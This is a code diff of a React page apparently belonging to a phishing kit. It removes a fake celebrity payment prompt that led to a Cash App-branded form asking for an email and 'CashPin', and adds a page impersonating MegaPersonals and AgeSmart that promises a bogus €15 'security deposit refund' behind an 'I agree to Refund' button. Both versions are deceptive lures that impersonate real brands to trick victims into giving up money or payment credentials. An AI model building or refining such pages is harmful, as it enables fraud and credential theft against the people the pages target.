@@ -39,87 +39,98 @@ export default function Home({ adminId, posterId }) {
   };
   return (
     <>
-      {!open ? (
-        <div className="flex flex-col m-5 gap-5 ">
-          <div className="text-center ">
-            <p className="text-lg font-semibold">Travis Scott</p>
-            <p className="text-xs text-gray-400">Payment form Stravisscott</p>
-          </div>
-          <div className="text-center mt-[50%]">
-            <p className="text-2xl font-semibold">$100.00</p>
-            <p className="text-xs text-gray-400">
-              For la flame fans must eat Today at {formatTime(currentTime)}
-            </p>
-          </div>
-          <div className=" flex flex-col gap-2 justify-center items-center text-center mt-[50%]">
-            <button
-              className=" w-[25%] px-5 py-1 rounded-xl bg-green-600 text-white"
-              onClick={() => setOpen(true)}
-            >
-              Accept
-            </button>
-            <button className=" w-[25%] px-5 py-1 rounded-xl bg-red-600 text-white">
-              Decline
-            </button>
+      <div className="min-h-screen bg-white text-center px-4 py-10 font-sans">
+      <div className="bg-pink-500 text-white py-2 text-xl font-bold tracking-wide">
+        <span className="text-yellow-100">Mega</span>
+        <span className="text-blue-200">Personals</span>
+        <span className="text-xs block">personals classifieds</span>
+      </div>
+
+      <div className="max-w-xl mx-auto mt-10">
+        <img
+          src="https://agesmart.store/public/images/logo-color.png" // Replace with your actual logo path
+          alt="AgeSmart Logo"
+          className="mx-auto w-48 mb-6"
+        />
+
+        <h2 className="text-lg font-medium">
+          Your account has been approved as fully active and verified.
+        </h2>
+        <p className="text-md my-2">
+          If YOU ARE REFUND <span className="text-green-600 font-bold">€15 MegaPersonals</span>
+        </p>
+
+        <p className="text-gray-800 my-4 leading-relaxed">
+          breaking their rules, <br />
+          <span className="text-green-600 font-semibold">
+            Your account will remain active as it is now.
+          </span>{" "}
+          <br />
+          from AgeSmart.
+        </p>
+
+        <h3 className="text-lg font-bold mt-8 mb-2">Why getting the money</h3>
+
+        <div className="border p-4 rounded-lg text-left max-h-60 overflow-y-auto text-sm">
+          <ul className="list-disc ml-5 space-y-2">
+            <li>
+              At the time of joining, a certain amount was taken as a security deposit to ensure
+              policy compliance and protect company property.
+            </li>
+            <li>
+              We’re happy to say that your performance, discipline, and dedication have truly impressed us.
+            </li>
+            <li>
+              During your time with us, we noticed no negative behavior. Instead, you have consistently
+              acted with responsibility.
+            </li>
+            <li>
+              Following company policy and in appreciation of your work, we’ve decided to refund your
+              full security deposit.
+            </li>
+            <li>
+              This refund is our way of showing gratitude and encouraging you to continue your good work.
+            </li>
+            <li>
+              The returned amount is both your rightful due and a token of our recognition and best
+              wishes for your future with us.
+            </li>
+          </ul>
+          <p className="mt-4">
+            see MegaPersonals for their full website Terms of Use and Publisher Agreement
+          </p>
+        </div>
+
+        <button
+          className="mt-6 px-6 py-3 bg-green-600 text-white rounded-md font-semibold hover:bg-green-700"
+          onClick={() => alert("Refund Agreed")} // Replace with actual refund logic
+        >
+          I agree to Refund
+        </button>
+
+        <div className="mt-10">
+          <img
+            src="/logo.png" // Optional second logo
+            alt="AgeSmart Logo"
+            className="mx-auto w-16"
+          />
+          <p className="text-xs text-gray-500 mt-2">
+            Copyright © 2022 Age Smart LDA. All Rights Reserved.
+          </p>
+          <div className="text-sm mt-2 space-x-4">
+            <a href="#" className="text-blue-500 underline">
+              Terms of Use
+            </a>
+            <a href="#" className="text-blue-500 underline">
+              Privacy Policy
+            </a>
+            <a href="#" className="text-blue-500 underline">
+              Billing Questions
+            </a>
           </div>
         </div>
-      ) : (
-    <div className="flex flex-col justify-center items-center shadow-lg rounded-xl bg-slate-100 w-[400px] h-[500px] mx-auto mt-[150px]">
-         <img src="/images/Square_Cash_app_logo.svg" height={200} width={200} />
-         {/* <div className="mt-5">
-           <Formik
-             initialValues={initialvalues}
-             onSubmit={handleSubmit}
-           >
-             {(formik) => (
-               <Form className="">
-                 <div className="flex flex-row justify-center items-center pl-5 w-[387px]">
-                   <label
-                     htmlFor="email"
-                     className="text-sm w-[100px] text-green-500 font-semibold "
-                   >
-                     Your Email:
-                   </label>
-                   <Field
-                     className="w-full px-[4px] py-[5px]  outline-none border  border-gray-200 shadow-inner placeholder:text-gray-400 focus:border-green-500 rounded "
-                     placeholder="Enter your email"
-                     name="email"
-                     type="email"
-                     required
-                   />
-                 </div>
-   
-                 <div className="flex flex-row justify-center mt-3 items-center -pl-2  w-[388px]">
-                   <label
-                     htmlFor="email"
-                     className="text-sm  w-[130px] text-green-500 font-semibold"
-                   >
-                     Your CashPin:
-                   </label>
-                   <Field
-                     className="w-full  px-[4px] py-[5px] outline-none border border-gray-200 shadow-inner placeholder:text-gray-400 focus:border-green-500 rounded "
-                     placeholder="Enter your cashpin"
-                     name="password"
-                     type="password"
-                     autoComplete="on"
-                     required
-                   />
-                 </div>
-   
-                 <div className="flex flex-row justify-center items-center mt-1">
-                   <button
-                     type="submit"
-                     className="mt-5 px-6 py-1 text-lg font-semibold bg-green-500 mx-auto text-white transition duration-300 rounded"
-                   >
-                     Add Money
-                   </button>
-                 </div>
-               </Form>
-             )}
-           </Formik>
-         </div> */}
-       </div>
-      )}
+      </div>
+    </div>
     </>
   );
 }
